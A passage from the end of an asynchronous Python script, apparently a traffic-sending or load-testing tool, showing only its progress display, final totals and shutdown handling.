                s, e, b = STATS["sent"], STATS["errs"], STATS["bytes"]
            rate = s / max(elapsed, 0.01)
            sys.stdout.write(f"\r  {elapsed:5.1f}s/{args.duration}s  sent={s:>9}  errs={e:>7}  "
                            f"rate={rate:>9.0f}/s  bytes={b/1e6:>7.1f}MB")
            sys.stdout.flush()
        print()
    pt = asyncio.create_task(prog())

    await asyncio.gather(*tasks, return_exceptions=True)
    STOP = True
    await pt

    async with LOCK:
        s, e, b = STATS["sent"], STATS["errs"], STATS["bytes"]
    print(f"\n  TOTAL sent={s}  errs={e}  bytes={b/1e6:.1f}MB  avg={s/max(args.duration,1):.0f}/s")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n  interrupted.")
